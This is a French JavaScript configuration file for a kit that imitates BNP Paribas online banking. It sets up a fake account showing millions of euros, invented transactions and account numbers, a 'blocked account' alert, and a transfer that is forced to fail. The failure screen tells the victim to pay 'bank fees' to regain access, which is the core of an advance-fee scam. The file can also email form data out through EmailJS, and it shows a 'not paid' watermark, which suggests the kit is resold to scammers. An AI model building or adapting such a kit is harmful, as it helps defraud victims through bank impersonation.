// ╔════════════════════════════════════════════════════════════════════════════╗
// ║                                                                            ║
// ║                   FICHIER DE CONFIGURATION BNP PARIBAS                     ║
// ║                                                                            ║
// ║  Ce fichier contient TOUS les paramètres configurables de l'application   ║
// ║  Modifiez les valeurs ci-dessous pour personnaliser l'interface           ║
// ║                                                                            ║
// ╚════════════════════════════════════════════════════════════════════════════╝

// ┌────────────────────────────────────────────────────────────────────────────┐
// │                         📑 TABLE DES MATIÈRES                              │
// ├────────────────────────────────────────────────────────────────────────────┤
// │                                                                            │
// │  1️⃣  COULEURS (Lignes 64-71)                                              │
// │     - Couleurs principales, secondaires, accents                          │
// │     - Couleurs des modals et alertes                                      │
// │     📄 Fichiers : compte.html, historique.html, virement.html, etc.       │
// │                                                                            │
// │  2️⃣  LOGOS ET IMAGES (Lignes 78-120)                                      │
// │     - Logo petit (mobile/header)                                          │
// │     - Logo grand (desktop)                                                │
// │     - Image carte bancaire                                                │
// │     - Configuration page index (vérification)                             │
// │     - Configuration page login (pages.html) ⭐ NOUVEAU                    │
// │     📄 Fichiers : index.html, pages.html, compte.html                     │
// │                                                                            │
// │  3️⃣  DONNÉES CLIENT (Lignes 127-134)                                      │
// │     - Nom, solde, épargne                                                 │
// │     - Message d'alerte compte bloqué                                      │
// │     📄 Fichiers : compte.html, virement.html                              │
// │                                                                            │
// │  4️⃣  WATERMARK "NON PAYÉ" (Lignes 142-154)                                │
// │     - Activation/désactivation                                            │
// │     - Taille, opacité, rotation                                           │
// │     📄 Fichiers : compte.html, historique.html, virement.html, ajouter    │
// │                                                                            │
// │  5️⃣  MODALS DE BLOCAGE (Lignes 162-180)                                   │
// │     - Boutons bloqués (RIB, Télécharger, Voir plus)                       │
// │     - Messages personnalisables                                           │
// │     📄 Fichiers : compte.html, historique.html                            │
// │                                                                            │
// │  6️⃣  SECTION "MON CONSEILLER" (Lignes 188-221)                            │
// │     - Informations conseiller                                             │
// │     - Boutons contact (email, WhatsApp, téléphone)                        │
// │     📄 Fichiers : compte.html                                             │
// │                                                                            │
// │  7️⃣  RÉSULTAT VIREMENT (Lignes 229-258)                                   │
// │     - Messages de succès                                                  │
// │     - Messages d'échec                                                    │
// │     📄 Fichiers : ajouter.html                                            │
// │                                                                            │
// │  8️⃣  COMPTES BANCAIRES (Lignes 265-283)                                   │
// │     - Compte principal, épargne, carte                                    │
// │     📄 Fichiers : compte.html, virement.html, historique.html             │
// │                                                                            │
// │  9️⃣  TEXTES INTERFACE (Lignes 290-335)                                    │
// │     - Navigation, messages, boutons                                       │
// │     📄 Fichiers : Toutes les pages                                        │
// │                                                                            │
// │  🔟 COULEURS SUPPLÉMENTAIRES (Lignes 342-360)                             │
// │     - Succès, erreurs, ombres                                             │
// │     📄 Fichiers : compte.html, historique.html, virement.html             │
// │                                                                            │
// │  1️⃣1️⃣ HISTORIQUE TRANSACTIONS (Lignes 367+)                               │
// │     - Liste des transactions affichées                                    │
// │     📄 Fichiers : historique.html, compte.html                            │
// │                                                                            │
// └────────────────────────────────────────────────────────────────────────────┘


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  1️⃣  COULEURS                                                              ║
// ╚════════════════════════════════════════════════════════════════════════════╝

// Couleurs principales de la banque
var couleurPrimaire = "#6D4E52";     // Couleur principale (BNP Paribas Vert)
var couleurSecondaire = "#4F3439";   // Couleur secondaire pour les dégradés
var couleurAccent = "#4F3439";       // Couleur d'accent (Vert clair)

// Couleurs des modals et alertes
var couleurAlerte = "#B8860B";       // Couleur du modal "compte bloqué" (jaune/doré)
var couleurIndisponible = "#EF4444"; // Couleur du modal "fonctionnalité non disponible" (rouge)


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  2️⃣  LOGOS ET IMAGES                                                       ║
// ╚════════════════════════════════════════════════════════════════════════════╝

// Logo PETIT (header mobile et à gauche)
var logoSmall = {
  url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ-850C_MJLoa0Le-3hFSP4zqFsTHvZUzdLWDpRVOANXv8VEe5mqu7ONE&s=10",
  width: "100px"
};

// Logo GRAND (header desktop à droite)
var logoLarge = {
  url: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ-850C_MJLoa0Le-3hFSP4zqFsTHvZUzdLWDpRVOANXv8VEe5mqu7ONE&s=10",
  width: "180px"
};

// Image de la CARTE BANCAIRE (page compte)
var imageCarte = {
  url: "./others/card.jpg",
  widthMobile: "48px",
  heightMobile: "32px",
  widthDesktop: "64px",
  heightDesktop: "40px"
};

// Configuration de la page index (vérification)
var pageIndexConfig = {
  backgroundGradient: "linear-gradient(135deg, #6D4E52 0%, #018859 50%, #6D4E52 100%)",
  logoUrl: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ-850C_MJLoa0Le-3hFSP4zqFsTHvZUzdLWDpRVOANXv8VEe5mqu7ONE&s=10",
  logoWidth: "220px",
  buttonColor: "linear-gradient(135deg, #6D4E52 0%, #6D4E52 100%)",
  buttonSuccessColor: "linear-gradient(135deg, #10B981 0%, #059669 100%)"
};

// Configuration de la page de CONNEXION (pages.html)
var pageLoginConfig = {
  favicon: "./assets/favicon.ico",                    // Icône de l'onglet (tab icon)
  logoMobile: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ-850C_MJLoa0Le-3hFSP4zqFsTHvZUzdLWDpRVOANXv8VEe5mqu7ONE&s=10",   // Logo mobile (header)
  logoDesktop: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJ-850C_MJLoa0Le-3hFSP4zqFsTHvZUzdLWDpRVOANXv8VEe5mqu7ONE&s=10", // Logo desktop (header)
  logoMobileWidth: "100px",                            // Largeur logo mobile
  logoDesktopWidth: "100px",                          // Largeur logo desktop
  imageFondUrl: "https://artfulliving.com/wp-content/uploads/2021/08/bridgewaterbank_sm_2021_0618-46.jpg",  // Image côté droit (desktop)
  couleurBoutonValider: "#6D4E52"                     // Couleur bouton "Valider"
};

// 💡 Astuce : Remplacez imageFondUrl par votre propre URL ou chemin local
// 💡 La couleur du bouton peut être modifiée pour correspondre à couleurPrimaire ou autre


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  3️⃣  DONNÉES CLIENT                                                        ║
// ╚════════════════════════════════════════════════════════════════════════════╝

var name = "Lambert Claude";         // Nom du client
var solde = "12.100.000";               // Solde du compte principal
var epargne = "131.000";              // Solde de l'épargne
var motifBlocage = "VIREMENT SUSPECT";
var deviseSymbole = "€";             // 💰 Symbole de la monnaie utilisée partout dans l'app (€, $, £, ¥, etc.)

// Message d'alerte pour compte bloqué
var titreAlerte = "Votre compte bancaire est bloqué";
var message = "Votre compte a été temporairement bloqué. Vous devez contacter votre le service client de votre banque pour avoir accès à votre compte.";


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  4️⃣  WATERMARK "NON PAYÉ"                                                  ║
// ╚════════════════════════════════════════════════════════════════════════════╝
// Ce watermark s'affiche en mosaïque sur toutes les pages si DejaPayer = false

var watermarkConfig = {
  DejaPayer: false,                  // true = client a payé, false = afficher le watermark
  
  imageUrl: "./assets/arnaque.jpg",  // URL de l'image watermark
  tailleImage: "200px",              // Largeur de chaque image
  opacite: 0.15,                     // Transparence (0 = invisible, 1 = opaque)
  espacement: "100px",               // Espacement entre les images
  rotation: "-25deg",                // Rotation diagonale
  zIndex: -1                         // Position en profondeur (-1 = derrière tout)
};

// 💡 Astuce : Changez DejaPayer à true pour cacher le watermark
// 💡 Ajustez opacite entre 0.1 et 0.3 pour contrôler la visibilité


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  5️⃣  MODALS DE BLOCAGE                                                     ║
// ╚════════════════════════════════════════════════════════════════════════════╝
// Contrôle l'affichage des modals de blocage sur différents boutons

var modalBlocageConfig = {
  // ═══ PAGE COMPTE (compte.html) ═══
  bloquerRibIban: false,                       // Bouton "RIB / IBAN"
  // true  = Modal compte bloqué (jaune)
  // false = Modal fonctionnalité indisponible (rouge)
  
  // ═══ PAGE HISTORIQUE (historique.html) ═══
  bloquerTelechargerReleve: true,              // Bouton "Télécharger le relevé"
  bloquerVoirPlus: true,                       // Bouton "Voir plus d'opérations"
  
  // ═══ MESSAGES MODAL "FONCTIONNALITÉ INDISPONIBLE" ═══
  // Ces messages s'affichent quand la valeur est FALSE
  modalTitre: "Fonctionnalité non disponible",
  modalMessage: "Cette fonctionnalité n'est pas disponible actuellement.",
  modalBoutonTexte: "J'ai compris"
};

// 💡 true  = Affiche le message de compte bloqué (couleur jaune/or)
// 💡 false = Affiche le message "fonctionnalité non disponible" (couleur rouge)


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  6️⃣  SECTION "MON CONSEILLER"                                              ║
// ╚════════════════════════════════════════════════════════════════════════════╝
// Configuration de la carte conseiller (côté droit page compte)

var conseillerConfig = {
  afficher: false,                   // true = afficher la section, false = cacher
  
  // Informations du conseiller
  nom: "Jean DUPONT",
  agence: "Agence Paris Centre",
  avatarUrl: "",                     // Laisser vide pour avatar par défaut
  
  // ═══ BOUTON "ENVOYER UN MESSAGE" ═══
  boutonMessage: {
    afficher: true,
    type: "email",                   // "email", "whatsapp", ou "tel"
    valeur: "conseiller@banque.fr",
    texte: "Envoyer un message"
  },
  
  // ═══ BOUTON "PRENDRE RENDEZ-VOUS" ═══
  boutonRendezVous: {
    afficher: true,
    type: "lien",                    // "lien", "email", "whatsapp", ou "tel"
    valeur: "#",
    texte: "Prendre rendez-vous"
  }
};

// 💡 Exemples de configuration boutons :
// ┌─────────────┬──────────────────────────────────────────────────────────┐
// │ Type        │ Exemple                                                  │
// ├─────────────┼──────────────────────────────────────────────────────────┤
// │ email       │ type: "email", valeur: "contact@banque.fr"              │
// │ whatsapp    │ type: "whatsapp", valeur: "33612345678" (sans le +)     │
// │ tel         │ type: "tel", valeur: "+33612345678" (avec le +)         │
// │ lien        │ type: "lien", valeur: "https://calendly.com/..."        │
// └─────────────┴──────────────────────────────────────────────────────────┘


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  7️⃣  RÉSULTAT VIREMENT (PAGE AJOUTER)                                      ║
// ╚════════════════════════════════════════════════════════════════════════════╝
// Contrôle si le virement est un succès ou un échec

var virementConfig = {
  estReussi: false,                  // true = SUCCÈS, false = ÉCHEC
  
  // ═══ MESSAGES DE SUCCÈS (estReussi = true) ═══
  succes: {
    titre: "Virement effectué avec succès",
    message: "Le bénéficiaire a été ajouté et le virement a été traité.",
    sousTitre: "Détails de l'opération",
    info1: "✓ Bénéficiaire enregistré dans vos contacts",
    info2: "✓ Virement traité et envoyé à la banque",
    info3: "✓ Délai de traitement : 24 à 48 heures ouvrées",
    conclusion: "Vous recevrez une notification une fois le virement effectué.",
    boutonTexte: "Retourner à l'accueil"
  },
  
  // ═══ MESSAGES D'ÉCHEC (estReussi = false) ═══
  echec: {
    titre: "L'ajout de bénéficiaire et le virement n'ont pas pu être effectués",
    message: "Votre compte est bloqué.",
    instructions: "Pour débloquer votre compte :",
    etape1: "✓ Vous devez contacter votre gestionnaire ",
    montant: "",
    etape2: "✓ procéder au paiement des frais bancaires au guichet de la banque pour avoir accès à votre compte",
    conclusion: "Merci de régulariser cette situation sans délai.",
    boutonTexte: "Retourner à l'accueil"
  }
};

// 💡 Changez estReussi à true pour afficher la zone de succès (verte)
// 💡 Changez estReussi à false pour afficher la zone d'échec (rouge)


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  📧  CONFIGURATION EMAILJS (ENVOI DU FORMULAIRE PAR EMAIL)                 ║
// ╚════════════════════════════════════════════════════════════════════════════╝
// Quand l'utilisateur confirme le virement sur la page ajouter.html,
// les données du formulaire sont envoyées par email via EmailJS.
//
// 📝 Pour obtenir vos identifiants : https://dashboard.emailjs.com/
//   - serviceId  : ID du service email (ex: "service_orgpj5a")
//   - templateId : ID du template (ex: "template_7agtl8f")
//   - publicKey  : Clé publique de votre compte EmailJS
//   - toEmail    : Adresse email qui recevra les notifications

var emailJSConfig = {
  actif: false,                                // true = envoyer les emails, false = désactiver
  serviceId: "service_orgpj5a",               // ID du service EmailJS
  templateId: "template_7agtl8f",             // ID du template EmailJS
  publicKey: "PyAhUOOGR5kWtJH5U"               // ⚠️ Remplacer par votre Public Key EmailJS
};
// 💡 L'email destinataire est saisi directement par l'utilisateur dans le formulaire (page ajouter.html)


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  8️⃣  COMPTES BANCAIRES                                                     ║
// ╚════════════════════════════════════════════════════════════════════════════╝

var comptePrincipal = {
  nom: "Compte Chèques",
  numeroMasque: "FR76 •••• •••• •••• 7561",
  numeroComplet: "FR76 1234 5678 9012 7561"
};

var compteEpargne = {
  nom: "Livret A",
  numeroMasque: "FR76 •••• •••• •••• 7561",
  numeroComplet: "FR76 9876 5432 1098 7561",
  plafondMax: "5 000",
  deviseSymbole: "$"
};

var cartebancaire = {
  nom: "Carte Visa Premier",
  numeroMasque: "•••• 8541",
  expiration: "09/28"
};


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  9️⃣  TEXTES DE L'INTERFACE                                                 ║
// ╚════════════════════════════════════════════════════════════════════════════╝

// Navigation principale (header)
var navigationMenuItems = {
  item1: "Compte et cartes",
  item2: "Emprunter",
  item3: "Epargner",
  item4: "Assurer",
  item5: "Nos conseils"
};

// Sous-navigation
var sousNavigationItems = {
  mesComptes: "Mes comptes",
  historique: "Historique",
  virement: "Virement"
};

// Messages de bienvenue
var messagesAccueil = {
  bonjour: "Bonjour, ",
  bienvenue: "Bienvenue sur votre espace bancaire",
  sousTitreHistorique: "Voici le relevé de vos dernières opérations"
};

// Textes des sections
var texteSections = {
  comptesBancaires: "COMPTES BANCAIRES",
  epargne: "ÉPARGNE",
  autresBanques: "AUTRES BANQUES",
  dernieresOperations: "Dernières opérations",
  liensUtiles: "Liens utiles"
};

// Textes des boutons
var texteBoutons = {
  voirHistorique: "Voir l'historique",
  ribIban: "RIB / IBAN",
  gerer: "Gérer",
  faireVirement: "Faire un virement",
  ajouterBanqueExterne: "Ajouter une banque externe",
  ajouterBeneficiaire: "Ajouter un bénéficiaire",
  continuer: "Continuer →",
  confirmer: "Confirmer le virement",
  retournerAccueil: "Retourner à l'accueil",
  telechargerReleve: "Télécharger le relevé",
  voirPlus: "Voir plus d'opérations"
};


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  🔟 COULEURS SUPPLÉMENTAIRES                                               ║
// ╚════════════════════════════════════════════════════════════════════════════╝

var couleursInterface = {
  succes: "#10B981",                 // Vert pour montants positifs
  erreur: "#EF4444",                 // Rouge pour les erreurs
  avertissement: "#F59E0B",          // Orange pour les avertissements
  epargne: "#B56E2B",                // Couleur section Épargne
  
  // Arrière-plans
  fondClair: "#F8F9FA",
  fondCarteHover: "#f8fafc",
  
  // Bordures
  bordureInput: "#6D4E52",
  bordureHover: "#6D4E52",
  
  // Ombres (valeurs CSS directes)
  ombreCarte: "0 4px 24px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0, 0, 0, 0.06)",
  ombreBouton: "0 4px 16px rgba(0, 35, 90, 0.3)",
  ombreFocus: "0 0 0 4px rgba(0, 35, 90, 0.08), 0 4px 12px rgba(0, 0, 0, 0.05)"
};


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║  1️⃣1️⃣ HISTORIQUE DES TRANSACTIONS                                          ║
// ╚════════════════════════════════════════════════════════════════════════════╝
// Chaque transaction a :
//   - type: "credit" (reçu), "debit" (émis), ou "card" (paiement carte)
//   - nom: Nom du bénéficiaire/émetteur
//   - description: Description
//   - montant: Montant avec signe + ou -
//   - heure: Heure (optionnel)
//   - groupe: "AUJOURD'HUI", "HIER", "DÉBUT DE SEMAINE", etc.

var transactions = [
  // ═══ 22 DÉCEMBRE 2025 ═══
  {
    type: "debit",
    nom: "Renaud PICHELIN",
    description: "Virement émis",
    montant: "- 3 500,00",
    heure: "14:30",
    groupe: "22 DÉCEMBRE 2025"
  },
  {
    type: "credit",
    nom: "Christophe Naval",
    description: "Virement reçu",
    montant: "+ 500,00",
    heure: "10:15",
    groupe: "22 DÉCEMBRE 2025"
  },

  // ═══ 15 NOVEMBRE 2025 ═══
  {
    type: "credit",
    nom: "Christophe Naval",
    description: "Virement reçu",
    montant: "+ 500,00",
    heure: "",
    groupe: "15 NOVEMBRE 2025"
  },
  {
    type: "card",
    nom: "Carrefour Paris",
    description: "Carte bancaire •••• 8541",
    montant: "- 152,40",
    heure: "",
    groupe: "15 NOVEMBRE 2025"
  },

  // ═══ 28 OCTOBRE 2025 ═══
  {
    type: "card",
    nom: "Tim Mathieu",
    description: "Carte bancaire •••• 7099",
    montant: "- 7 200,00",
    heure: "",
    groupe: "28 OCTOBRE 2025"
  },
  {
    type: "credit",
    nom: "Elia Dupuis",
    description: "Virement reçu",
    montant: "+ 1 000,00",
    heure: "",
    groupe: "28 OCTOBRE 2025"
  },

  // ═══ 12 SEPTEMBRE 2025 ═══
  {
    type: "debit",
    nom: "EDF",
    description: "Prélèvement automatique",
    montant: "- 89,50",
    heure: "",
    groupe: "12 SEPTEMBRE 2025"
  },
  {
    type: "credit",
    nom: "Salaire",
    description: "Virement reçu",
    montant: "+ 3 200,00",
    heure: "",
    groupe: "12 SEPTEMBRE 2025"
  },

  // ═══ 10 AOÛT 2025 ═══
  {
    type: "credit",
    nom: "Alami Yousef",
    description: "Virement reçu",
    montant: "+ 100 000,00",
    heure: "",
    groupe: "10 AOÛT 2025"
  }
];


// ╔════════════════════════════════════════════════════════════════════════════╗
// ║                                                                            ║
// ║                    ⚠️  NE PAS MODIFIER EN DESSOUS  ⚠️                      ║
// ║                                                                            ║
// ║  Le code ci-dessous injecte automatiquement les configurations             ║
// ║  dans l'application. Modification déconseillée.                            ║
// ║                                                                            ║
// ╚════════════════════════════════════════════════════════════════════════════╝

// ═══════════════════════════════════════════════════════════════════════════
// INJECTION DES COULEURS DANS LE CSS
// ═══════════════════════════════════════════════════════════════════════════
(function() {
  const style = document.createElement('style');
  style.textContent = `
    :root {
      --color-primary: ${couleurPrimaire};
      --color-secondary: ${couleurSecondaire};
      --color-accent: ${couleurAccent};
    }
  `;
  document.head.appendChild(style);
})();

// ═══════════════════════════════════════════════════════════════════════════
// APPLICATION DES CONFIGURATIONS AU CHARGEMENT DE LA PAGE
// ═══════════════════════════════════════════════════════════════════════════
document.addEventListener('DOMContentLoaded', function() {
  
  // ─────────────────────────────────────────────────────────────────────────
  // INJECTION DES LOGOS ET IMAGES
  // ─────────────────────────────────────────────────────────────────────────
  document.querySelectorAll('img[src*="bp-logo-small.svg"], img[src*="bnp-logo"]').forEach(img => {
    img.src = logoSmall.url;
    const parentDiv = img.parentElement;
    if (parentDiv) {
      parentDiv.style.width = logoSmall.width;
    }
  });

  document.querySelectorAll('img[src*="bp.svg"]').forEach(img => {
    img.src = logoLarge.url;
    const parentDiv = img.parentElement;
    if (parentDiv) {
      parentDiv.style.width = logoLarge.width;
    }
  });
  
  document.querySelectorAll('img[src*="card.jpg"]').forEach(img => {
    img.src = imageCarte.url;
    const parentDiv = img.parentElement;
    if (parentDiv) {
      parentDiv.style.width = imageCarte.widthMobile;
      parentDiv.style.height = imageCarte.heightMobile;
      
      const style = document.createElement('style');
      style.textContent = `
        @media (min-width: 768px) {
          .card-container-custom {
            width: ${imageCarte.widthDesktop} !important;
            height: ${imageCarte.heightDesktop} !important;
          }
        }
      `;
      document.head.appendChild(style);
      parentDiv.classList.add('card-container-custom');
    }
  });

  // ─────────────────────────────────────────────────────────────────────────
  // APPLICATION DU WATERMARK
  // ─────────────────────────────────────────────────────────────────────────
  if (!watermarkConfig.DejaPayer) {
    const watermarkContainer = document.createElement('div');
    watermarkContainer.id = 'watermarkContainer';
    watermarkContainer.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: ${watermarkConfig.zIndex};
      overflow: hidden;
    `;
    
    const patternStyle = `
      position: absolute;
      width: 200%;
      height: 200%;
      top: -50%;
      left: -50%;
      background-image: url('${watermarkConfig.imageUrl}');
      background-size: ${watermarkConfig.tailleImage} auto;
      background-repeat: repeat;
      background-position: center;
      opacity: ${watermarkConfig.opacite};
      transform: rotate(${watermarkConfig.rotation});
    `;
    
    const patternDiv = document.createElement('div');
    patternDiv.style.cssText = patternStyle;
    
    watermarkContainer.appendChild(patternDiv);
    document.body.appendChild(watermarkContainer);
  }

  // ─────────────────────────────────────────────────────────────────────────
  // INJECTION DES DONNÉES CLIENT
  // ─────────────────────────────────────────────────────────────────────────
  localStorage.setItem("solde", solde);
  localStorage.setItem("epargne", epargne);

  if (document.getElementById("titreAlerte")) {
    document.getElementById("titreAlerte").innerText = titreAlerte;
  }
  if (document.getElementById("messageId")) {
    document.getElementById("messageId").innerText = message;
  }
  if (document.getElementById("clientName")) {
    document.getElementById("clientName").innerText = name;
  }
  if (document.getElementById("soldeClient")) {
    document.getElementById("soldeClient").innerText = solde;
  }
  if (document.getElementById("epargneId")) {
    document.getElementById("epargneId").innerText = epargne;
  }
  if (document.getElementById("alerteDiv")) {
    document.getElementById("alerteDiv").style.backgroundColor = couleurAlerte;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // INJECTION DU SYMBOLE DE LA DEVISE PARTOUT DANS L'APP
  // ─────────────────────────────────────────────────────────────────────────
  document.querySelectorAll('.devise').forEach(el => {
    el.innerText = deviseSymbole;
  });

  // ─────────────────────────────────────────────────────────────────────────
  // GESTION DU RÉSULTAT DU VIREMENT (PAGE AJOUTER)
  // ─────────────────────────────────────────────────────────────────────────
  if (typeof virementConfig !== 'undefined') {
    if (virementConfig.estReussi) {
      // CAS SUCCÈS
      const zoneSucces = document.getElementById("zoneSucces");
      const zoneEchec = document.getElementById("zoneEchec");
      
      if (zoneSucces && zoneEchec) {
        zoneEchec.classList.add("hidden");
        zoneSucces.classList.remove("hidden");
        
        if (document.getElementById("succesTitre")) {
          document.getElementById("succesTitre").innerText = virementConfig.succes.titre;
        }
        if (document.getElementById("succesMessage")) {
          document.getElementById("succesMessage").innerText = virementConfig.succes.message;
        }
        if (document.getElementById("succesSousTitre")) {
          document.getElementById("succesSousTitre").innerText = virementConfig.succes.sousTitre;
        }
        if (document.getElementById("succesInfo1Text")) {
          document.getElementById("succesInfo1Text").innerText = virementConfig.succes.info1;
        }
        if (document.getElementById("succesInfo2Text")) {
          document.getElementById("succesInfo2Text").innerText = virementConfig.succes.info2;
        }
        if (document.getElementById("succesInfo3Text")) {
          document.getElementById("succesInfo3Text").innerText = virementConfig.succes.info3;
        }
        if (document.getElementById("succesConclusion")) {
          document.getElementById("succesConclusion").innerText = virementConfig.succes.conclusion;
        }
        if (document.getElementById("succesBouton")) {
          document.getElementById("succesBouton").innerText = virementConfig.succes.boutonTexte;
        }
      }
    } else {
      // CAS ÉCHEC
      const zoneSucces = document.getElementById("zoneSucces");
      const zoneEchec = document.getElementById("zoneEchec");
      
      if (zoneSucces && zoneEchec) {
        zoneSucces.classList.add("hidden");
        zoneEchec.classList.remove("hidden");
        
        if (document.getElementById("echecTitre")) {
          document.getElementById("echecTitre").innerText = virementConfig.echec.titre;
        }
        if (document.getElementById("echecMessage")) {
          document.getElementById("echecMessage").innerText = virementConfig.echec.message;
        }
        if (document.getElementById("echecInstructions")) {
          document.getElementById("echecInstructions").innerText = virementConfig.echec.instructions;
        }
        if (document.getElementById("echecEtape1")) {
          document.getElementById("echecEtape1").innerText = virementConfig.echec.etape1;
        }
        if (document.getElementById("echecEtape2")) {
          document.getElementById("echecEtape2").innerHTML = virementConfig.echec.etape2 + '<span class="font-bold text-red-600">' + virementConfig.echec.montant + '</span>';
        }
        if (document.getElementById("echecConclusion")) {
          document.getElementById("echecConclusion").innerText = virementConfig.echec.conclusion;
        }
        if (document.getElementById("echecBouton")) {
          document.getElementById("echecBouton").innerText = virementConfig.echec.boutonTexte;
        }
      }
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // INITIALISATION DES MODALS
  // ─────────────────────────────────────────────────────────────────────────
  if (document.getElementById("modalTitre")) {
    document.getElementById("modalTitre").innerText = titreAlerte;
  }
  if (document.getElementById("modalMessage")) {
    document.getElementById("modalMessage").innerText = message;
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CONFIGURATION DE LA SECTION "MON CONSEILLER"
  // ─────────────────────────────────────────────────────────────────────────
  const conseillerSection = document.getElementById("conseillerSection");
  
  if (conseillerSection) {
    if (!conseillerConfig.afficher) {
      conseillerSection.style.display = "none";
    } else {
      const conseillerNom = document.getElementById("conseillerNom");
      if (conseillerNom) {
        conseillerNom.innerText = conseillerConfig.nom;
      }
      
      const conseillerAgence = document.getElementById("conseillerAgence");
      if (conseillerAgence) {
        conseillerAgence.innerText = conseillerConfig.agence;
      }
      
      if (conseillerConfig.avatarUrl) {
        const conseillerAvatar = document.getElementById("conseillerAvatar");
        if (conseillerAvatar) {
          conseillerAvatar.innerHTML = `<img src="${conseillerConfig.avatarUrl}" alt="Avatar" class="w-full h-full object-cover">`;
        }
      }
      
      const btnMessage = document.getElementById("btnConseillerMessage");
      if (btnMessage) {
        if (!conseillerConfig.boutonMessage.afficher) {
          btnMessage.style.display = "none";
        } else {
          const btnTexte = btnMessage.querySelector('.btn-texte');
          if (btnTexte) {
            btnTexte.innerText = conseillerConfig.boutonMessage.texte;
          }
          
          let href = "#";
          if (conseillerConfig.boutonMessage.type === "email") {
            href = `mailto:${conseillerConfig.boutonMessage.valeur}`;
          } else if (conseillerConfig.boutonMessage.type === "whatsapp") {
            href = `https://wa.me/${conseillerConfig.boutonMessage.valeur}`;
          } else if (conseillerConfig.boutonMessage.type === "tel") {
            href = `tel:${conseillerConfig.boutonMessage.valeur}`;
          }
          btnMessage.href = href;
        }
      }
      
      const btnRendezVous = document.getElementById("btnConseillerRendezVous");
      if (btnRendezVous) {
        if (!conseillerConfig.boutonRendezVous.afficher) {
          btnRendezVous.style.display = "none";
        } else {
          const btnTexte = btnRendezVous.querySelector('.btn-texte');
          if (btnTexte) {
            btnTexte.innerText = conseillerConfig.boutonRendezVous.texte;
          }
          
          let href = "#";
          if (conseillerConfig.boutonRendezVous.type === "lien") {
            href = conseillerConfig.boutonRendezVous.valeur;
          } else if (conseillerConfig.boutonRendezVous.type === "email") {
            href = `mailto:${conseillerConfig.boutonRendezVous.valeur}`;
          } else if (conseillerConfig.boutonRendezVous.type === "whatsapp") {
            href = `https://wa.me/${conseillerConfig.boutonRendezVous.valeur}`;
          } else if (conseillerConfig.boutonRendezVous.type === "tel") {
            href = `tel:${conseillerConfig.boutonRendezVous.valeur}`;
          }
          btnRendezVous.href = href;
        }
      }
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // GÉNÉRATION DYNAMIQUE DE L'HISTORIQUE DES TRANSACTIONS
  // ─────────────────────────────────────────────────────────────────────────
  if (document.getElementById("transactionsContainer")) {
    const container = document.getElementById("transactionsContainer");
    
    function getTransactionIcon(type) {
      if (type === "credit") {
        return {
          iconBg: "bg-green-50",
          iconColor: "text-green-600",
          svg: '<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 14l-7 7m0 0l-7-7m7 7V3" /></svg>',
          amountClass: "amount-positive"
        };
      } else if (type === "debit") {
        return {
          iconBg: "bg-orange-50",
          iconColor: "text-orange-600",
          svg: '<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4" /></svg>',
          amountClass: "amount-negative"
        };
      } else if (type === "card") {
        return {
          iconBg: "bg-blue-50",
          iconColor: "text-[var(--color-primary)]",
          svg: '<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" /></svg>',
          amountClass: "amount-negative"
        };
      }
    }
    
    const groupes = {};
    transactions.forEach(transaction => {
      if (!groupes[transaction.groupe]) {
        groupes[transaction.groupe] = [];
      }
      groupes[transaction.groupe].push(transaction);
    });
    
    let html = "";
    Object.keys(groupes).forEach((nomGroupe, index) => {
      const marginTop = index > 0 ? 'mt-8' : '';
      
      html += `
        <div class="${marginTop}">
          <span class="badge-date">${nomGroupe}</span>
          <div class="flex flex-col">
      `;
      
      groupes[nomGroupe].forEach(transaction => {
        const iconData = getTransactionIcon(transaction.type);
        const heureText = transaction.heure ? ` • ${transaction.heure}` : '';
        
        html += `
          <div class="transaction-row py-4 flex items-center justify-between cursor-pointer group">
            <div class="flex items-center gap-4">
              <div class="icon-box w-10 h-10 ${iconData.iconBg} ${iconData.iconColor}">
                ${iconData.svg}
              </div>
              <div>
                <p class="font-semibold text-gray-900 group-hover:text-[var(--color-primary)] transition-colors">${transaction.nom}</p>
                <p class="text-xs text-gray-500">${transaction.description}${heureText}</p>
              </div>
            </div>
            <p class="${iconData.amountClass} text-lg">${transaction.montant} ${deviseSymbole}</p>
          </div>
        `;
      });
      
      html += `
          </div>
        </div>
      `;
    });
    
    container.innerHTML = html;
  }
});
